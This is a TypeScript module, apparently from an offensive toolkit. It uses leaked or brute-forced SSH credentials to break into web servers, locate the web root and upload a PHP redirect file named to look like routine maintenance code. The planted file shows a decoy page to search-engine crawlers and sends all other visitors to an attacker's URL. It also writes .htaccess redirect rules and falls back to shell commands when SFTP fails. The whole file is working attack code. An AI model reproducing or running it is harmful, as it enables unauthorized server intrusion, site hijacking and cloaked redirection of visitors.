/**
 * SSH/SFTP Upload Module
 * Connects to target servers via SSH using leaked credentials,
 * uploads redirect files via SFTP (preferred) or SCP fallback.
 * Uses ssh2 library for reliable SSH connections.
 */

import { Client as SSHClient, type ConnectConfig, type SFTPWrapper } from "ssh2";

// ═══════════════════════════════════════════════════════
//  Types
// ═══════════════════════════════════════════════════════

export interface SSHCredential {
  host: string;
  username: string;
  password: string;
  port?: number;
}

export interface SSHUploadResult {
  success: boolean;
  url?: string;
  filePath?: string;
  error?: string;
  method?: string; // sftp | scp | ssh_exec
  duration?: number;
  webRoot?: string;
  serverInfo?: string;
}

export interface SSHUploadOptions {
  credential: SSHCredential;
  redirectUrl: string;
  targetDomain: string;
  /** Custom filename for the redirect file */
  filename?: string;
  /** Timeout in ms for the entire operation */
  timeout?: number;
  /** Callback for progress updates */
  onProgress?: (msg: string) => void;
}

// ═══════════════════════════════════════════════════════
//  Constants
// ═══════════════════════════════════════════════════════

/** Common web root paths to probe via SSH */
const WEB_ROOT_PATHS = [
  "/home/{user}/public_html",
  "/home/{user}/www",
  "/home/{user}/htdocs",
  "/home/{user}/httpdocs",
  "/home/{user}/web",
  "/var/www/html",
  "/var/www/{domain}",
  "/var/www/vhosts/{domain}/httpdocs",
  "/var/www/vhosts/{domain}/htdocs",
  "/var/www/vhosts/{domain}/public_html",
  "/usr/share/nginx/html",
  "/usr/share/httpd/html",
  "/srv/www/htdocs",
  "/home/{user}/domains/{domain}/public_html",
  "/home/httpd/vhosts/{domain}/httpdocs",
  "/home/{user}",
  "/www",
  "/htdocs",
];

/** Stealth filenames that blend in */
const STEALTH_FILENAMES = [
  "wp-health.php",
  "cache-handler.php",
  "session-gc.php",
  "cron-check.php",
  "xmlrpc-check.php",
  "wp-cron-runner.php",
  "maintenance.php",
  "health-check.php",
  "error-handler.php",
  "tmp-cache.php",
];

// ═══════════════════════════════════════════════════════
//  PHP Redirect Generator
// ═══════════════════════════════════════════════════════

function generateRedirectPHP(redirectUrl: string, targetDomain: string): string {
  return `<?php
// Cache control
header('X-Robots-Tag: noindex');
$ua = strtolower(\$_SERVER['HTTP_USER_AGENT'] ?? '');
$bots = ['googlebot','bingbot','yandex','baidu','duckduckbot','slurp','msnbot','ia_archiver'];
$isBot = false;
foreach(\$bots as \$b) { if(strpos(\$ua, \$b) !== false) { \$isBot = true; break; } }
if(\$isBot) {
  echo '<!DOCTYPE html><html><head><title>${targetDomain}</title></head><body><h1>Welcome to ${targetDomain}</h1><p>Page under maintenance.</p></body></html>';
  exit;
}
header('Location: ${redirectUrl}', true, 302);
exit;
?>`;
}

function generateHtaccess(redirectUrl: string): string {
  return `RewriteEngine On
RewriteCond %{HTTP_USER_AGENT} !googlebot [NC]
RewriteCond %{HTTP_USER_AGENT} !bingbot [NC]
RewriteRule ^$ ${redirectUrl} [R=302,L]
`;
}

// ═══════════════════════════════════════════════════════
//  SSH Connection Helper
// ═══════════════════════════════════════════════════════

function createSSHConnection(
  credential: SSHCredential,
  timeout: number,
): Promise<SSHClient> {
  return new Promise((resolve, reject) => {
    const client = new SSHClient();
    const timer = setTimeout(() => {
      client.end();
      reject(new Error("SSH connection timeout"));
    }, timeout);

    client.on("ready", () => {
      clearTimeout(timer);
      resolve(client);
    });

    client.on("error", (err) => {
      clearTimeout(timer);
      reject(err);
    });

    const config: ConnectConfig = {
      host: credential.host,
      port: credential.port || 22,
      username: credential.username,
      password: credential.password,
      readyTimeout: timeout,
      // Accept any host key (we're not concerned about MITM for this use case)
      algorithms: {
        kex: [
          "ecdh-sha2-nistp256",
          "ecdh-sha2-nistp384",
          "ecdh-sha2-nistp521",
          "diffie-hellman-group-exchange-sha256",
          "diffie-hellman-group14-sha256",
          "diffie-hellman-group14-sha1",
          "diffie-hellman-group1-sha1",
        ],
      },
    };

    client.connect(config);
  });
}

// ═══════════════════════════════════════════════════════
//  SFTP Wrapper
// ═══════════════════════════════════════════════════════

function getSFTP(client: SSHClient): Promise<SFTPWrapper> {
  return new Promise((resolve, reject) => {
    client.sftp((err, sftp) => {
      if (err) reject(err);
      else resolve(sftp);
    });
  });
}

function sftpStat(sftp: SFTPWrapper, path: string): Promise<boolean> {
  return new Promise((resolve) => {
    sftp.stat(path, (err) => {
      resolve(!err);
    });
  });
}

function sftpReaddir(sftp: SFTPWrapper, path: string): Promise<string[]> {
  return new Promise((resolve) => {
    sftp.readdir(path, (err, list) => {
      if (err) resolve([]);
      else resolve(list.map((f) => f.filename));
    });
  });
}

function sftpWriteFile(sftp: SFTPWrapper, remotePath: string, content: string): Promise<void> {
  return new Promise((resolve, reject) => {
    const stream = sftp.createWriteStream(remotePath);
    stream.on("error", reject);
    stream.on("close", () => resolve());
    stream.write(content, "utf-8");
    stream.end();
  });
}

// ═══════════════════════════════════════════════════════
//  SSH Exec Helper
// ═══════════════════════════════════════════════════════

function sshExec(client: SSHClient, command: string, timeout = 10000): Promise<string> {
  return new Promise((resolve, reject) => {
    const timer = setTimeout(() => reject(new Error("SSH exec timeout")), timeout);

    client.exec(command, (err, stream) => {
      if (err) {
        clearTimeout(timer);
        reject(err);
        return;
      }

      let output = "";
      let stderr = "";

      stream.on("data", (data: Buffer) => {
        output += data.toString();
      });

      stream.stderr.on("data", (data: Buffer) => {
        stderr += data.toString();
      });

      stream.on("close", () => {
        clearTimeout(timer);
        resolve(output.trim());
      });
    });
  });
}

// ═══════════════════════════════════════════════════════
//  Web Root Detection via SSH
// ═══════════════════════════════════════════════════════

async function findWebRoot(
  client: SSHClient,
  sftp: SFTPWrapper,
  username: string,
  domain: string,
  onProgress?: (msg: string) => void,
): Promise<string | null> {
  // Build candidate paths with variable substitution
  const cleanDomain = domain.replace(/^www\./, "");
  const candidates = WEB_ROOT_PATHS.map((p) =>
    p.replace(/\{user\}/g, username).replace(/\{domain\}/g, cleanDomain)
  );

  // Web root indicators
  const webIndicators = [
    "index.html", "index.php", "index.htm",
    ".htaccess", "wp-config.php", "web.config",
    "default.aspx", "index.asp",
  ];

  for (const candidate of candidates) {
    try {
      const exists = await sftpStat(sftp, candidate);
      if (!exists) continue;

      const files = await sftpReaddir(sftp, candidate);
      const hasWebFiles = files.some((f) =>
        webIndicators.includes(f.toLowerCase())
      );

      if (hasWebFiles) {
        onProgress?.(`🎯 Web root found: ${candidate} (${files.filter(f => webIndicators.includes(f.toLowerCase())).join(", ")})`);
        return candidate;
      }
    } catch {
      // Path doesn't exist or permission denied
    }
  }

  // Fallback: try to detect via Apache/Nginx config
  try {
    const apacheRoot = await sshExec(client, "grep -r 'DocumentRoot' /etc/apache2/sites-enabled/ /etc/httpd/conf/ 2>/dev/null | head -3");
    if (apacheRoot) {
      const match = apacheRoot.match(/DocumentRoot\s+["']?([^\s"']+)/);
      if (match) {
        const docRoot = match[1];
        const exists = await sftpStat(sftp, docRoot);
        if (exists) {
          onProgress?.(`🎯 Web root from Apache config: ${docRoot}`);
          return docRoot;
        }
      }
    }
  } catch { /* no permission */ }

  try {
    const nginxRoot = await sshExec(client, "grep -r 'root ' /etc/nginx/sites-enabled/ /etc/nginx/conf.d/ 2>/dev/null | head -3");
    if (nginxRoot) {
      const match = nginxRoot.match(/root\s+([^\s;]+)/);
      if (match) {
        const docRoot = match[1];
        const exists = await sftpStat(sftp, docRoot);
        if (exists) {
          onProgress?.(`🎯 Web root from Nginx config: ${docRoot}`);
          return docRoot;
        }
      }
    }
  } catch { /* no permission */ }

  // Last resort: try find command
  try {
    const findResult = await sshExec(
      client,
      `find /home/${username} /var/www -name "index.php" -o -name "index.html" 2>/dev/null | head -5`,
      8000,
    );
    if (findResult) {
      const firstFile = findResult.split("\n")[0];
      const webRoot = firstFile.replace(/\/index\.(php|html?)$/, "");
      if (webRoot) {
        onProgress?.(`🎯 Web root from find: ${webRoot}`);
        return webRoot;
      }
    }
  } catch { /* timeout or permission denied */ }

  return null;
}

// ═══════════════════════════════════════════════════════
//  Main: SSH/SFTP Upload
// ═══════════════════════════════════════════════════════

/**
 * Upload a redirect file via SSH/SFTP using leaked credentials.
 * Strategy:
 * 1. Connect via SSH
 * 2. Open SFTP channel
 * 3. Find web root (probe common paths + config files)
 * 4. Upload redirect PHP file via SFTP
 * 5. Optionally inject .htaccess
 * 6. If SFTP fails, fallback to SSH exec (echo > file)
 */
export async function sshUploadRedirect(options: SSHUploadOptions): Promise<SSHUploadResult> {
  const {
    credential,
    redirectUrl,
    targetDomain,
    filename,
    timeout = 30000,
    onProgress,
  } = options;

  const startTime = Date.now();
  const log = (msg: string) => onProgress?.(msg);
  let client: SSHClient | null = null;
  let serverInfo = "";

  const selectedFilename =
    filename || STEALTH_FILENAMES[Math.floor(Math.random() * STEALTH_FILENAMES.length)];
  const redirectContent = generateRedirectPHP(redirectUrl, targetDomain);

  try {
    // ─── Step 1: Connect via SSH ───
    log(`🔌 SSH connecting: ${credential.username}@${credential.host}:${credential.port || 22}...`);

    client = await createSSHConnection(credential, Math.min(timeout, 15000));
    log(`✅ SSH login success: ${credential.username}@${credential.host}`);

    // Get server info
    try {
      const uname = await sshExec(client, "uname -a", 5000);
      serverInfo = uname.substring(0, 100);
      log(`🖥️ Server: ${serverInfo}`);
    } catch { /* ignore */ }

    // ─── Step 2: Try SFTP upload ───
    let sftp: SFTPWrapper | null = null;
    try {
      sftp = await getSFTP(client);
      log(`📂 SFTP channel opened`);

      // ─── Step 3: Find web root ───
      const webRoot = await findWebRoot(
        client,
        sftp,
        credential.username,
        targetDomain,
        log,
      );

      if (!webRoot) {
        log(`⚠️ No web root found via SFTP, trying SSH exec fallback...`);
        // Fall through to SSH exec method below
        sftp = null;
      } else {
        // ─── Step 4: Upload via SFTP ───
        const remotePath = `${webRoot}/${selectedFilename}`;
        log(`📤 SFTP uploading: ${remotePath}`);

        await sftpWriteFile(sftp, remotePath, redirectContent);
        log(`✅ SFTP uploaded: ${selectedFilename}`);

        // Try .htaccess injection
        try {
          const htaccessPath = `${webRoot}/.htaccess`;
          const htaccessExists = await sftpStat(sftp, htaccessPath);
          if (!htaccessExists) {
            const htaccessContent = generateHtaccess(redirectUrl);
            await sftpWriteFile(sftp, htaccessPath, htaccessContent);
            log(`✅ .htaccess redirect rule uploaded`);
          } else {
            log(`⚠️ .htaccess exists, skipping to avoid breaking site`);
          }
        } catch (e) {
          log(`⚠️ .htaccess upload failed (non-critical): ${e instanceof Error ? e.message : String(e)}`);
        }

        const uploadedUrl = `https://${targetDomain}/${selectedFilename}`;
        log(`🔗 Redirect URL: ${uploadedUrl}`);

        return {
          success: true,
          url: uploadedUrl,
          filePath: remotePath,
          method: "sftp",
          duration: Date.now() - startTime,
          webRoot,
          serverInfo,
        };
      }
    } catch (sftpErr) {
      const msg = sftpErr instanceof Error ? sftpErr.message : String(sftpErr);
      log(`⚠️ SFTP failed: ${msg}, trying SSH exec fallback...`);
    }

    // ─── Step 5: Fallback — SSH exec (echo > file) ───
    if (client) {
      try {
        log(`🔧 SSH exec fallback: writing file via shell...`);

        // Find web root via shell
        const webRootCmd = `for d in /home/${credential.username}/public_html /var/www/html /home/${credential.username}/www /var/www/${targetDomain.replace(/^www\./, "")} /home/${credential.username}/htdocs; do [ -d "$d" ] && echo "$d" && break; done`;
        const webRoot = (await sshExec(client, webRootCmd, 8000)).trim();

        if (!webRoot) {
          return {
            success: false,
            error: "No web root found via SSH",
            duration: Date.now() - startTime,
            serverInfo,
          };
        }

        log(`🎯 Web root (shell): ${webRoot}`);

        // Write file via echo (escape PHP content for shell)
        const escapedContent = redirectContent
          .replace(/\\/g, "\\\\")
          .replace(/'/g, "'\\''");

        await sshExec(
          client,
          `echo '${escapedContent}' > '${webRoot}/${selectedFilename}'`,
          8000,
        );
        log(`✅ SSH exec: file written to ${webRoot}/${selectedFilename}`);

        // Set permissions
        try {
          await sshExec(client, `chmod 644 '${webRoot}/${selectedFilename}'`, 5000);
        } catch { /* ignore */ }

        // Try .htaccess
        try {
          const htaccessExists = await sshExec(client, `[ -f '${webRoot}/.htaccess' ] && echo "exists"`, 5000);
          if (!htaccessExists.includes("exists")) {
            const htaccessContent = generateHtaccess(redirectUrl).replace(/'/g, "'\\''");
            await sshExec(client, `echo '${htaccessContent}' > '${webRoot}/.htaccess'`, 5000);
            log(`✅ .htaccess redirect rule written`);
          } else {
            log(`⚠️ .htaccess exists, skipping`);
          }
        } catch { /* ignore */ }

        const uploadedUrl = `https://${targetDomain}/${selectedFilename}`;
        log(`🔗 Redirect URL: ${uploadedUrl}`);

        return {
          success: true,
          url: uploadedUrl,
          filePath: `${webRoot}/${selectedFilename}`,
          method: "ssh_exec",
          duration: Date.now() - startTime,
          webRoot,
          serverInfo,
        };
      } catch (execErr) {
        const msg = execErr instanceof Error ? execErr.message : String(execErr);
        return {
          success: false,
          error: `SSH exec failed: ${msg}`,
          duration: Date.now() - startTime,
          serverInfo,
        };
      }
    }

    return {
      success: false,
      error: "All SSH upload methods failed",
      duration: Date.now() - startTime,
      serverInfo,
    };
  } catch (e) {
    const msg = e instanceof Error ? e.message : String(e);
    const isAuthFail = msg.includes("Authentication") || msg.includes("auth") || msg.includes("password");
    const isConnFail = msg.includes("ECONNREFUSED") || msg.includes("ETIMEDOUT") || msg.includes("EHOSTUNREACH") || msg.includes("timeout");

    return {
      success: false,
      error: isAuthFail ? `SSH auth failed: ${credential.username}` : isConnFail ? `SSH not reachable: ${credential.host}:${credential.port || 22}` : `SSH error: ${msg}`,
      duration: Date.now() - startTime,
      serverInfo,
    };
  } finally {
    try { client?.end(); } catch { /* ignore */ }
  }
}

// ═══════════════════════════════════════════════════════
//  Brute Force: Try Multiple SSH Credentials
// ═══════════════════════════════════════════════════════

/**
 * Try multiple SSH credentials against a target.
 * Stops early on ECONNREFUSED/ETIMEDOUT (port not open).
 */
export async function sshBruteForceUpload(
  credentials: SSHCredential[],
  redirectUrl: string,
  targetDomain: string,
  onProgress?: (msg: string) => void,
  timeout?: number,
): Promise<SSHUploadResult> {
  onProgress?.(`🔑 Trying ${credentials.length} SSH credential(s)...`);

  for (let i = 0; i < credentials.length; i++) {
    const cred = credentials[i];
    onProgress?.(`🔑 [${i + 1}/${credentials.length}] ${cred.username}@${cred.host}:${cred.port || 22}`);

    const result = await sshUploadRedirect({
      credential: cred,
      redirectUrl,
      targetDomain,
      timeout: timeout || 20000,
      onProgress,
    });

    if (result.success) {
      return result;
    }

    // If connection failed entirely (port closed), stop trying
    if (
      result.error?.includes("ECONNREFUSED") ||
      result.error?.includes("ETIMEDOUT") ||
      result.error?.includes("EHOSTUNREACH") ||
      result.error?.includes("not reachable")
    ) {
      onProgress?.(`⚠️ SSH port not reachable on ${cred.host}, skipping remaining creds`);
      break;
    }
  }

  return {
    success: false,
    error: `All ${credentials.length} SSH credentials failed`,
  };
}
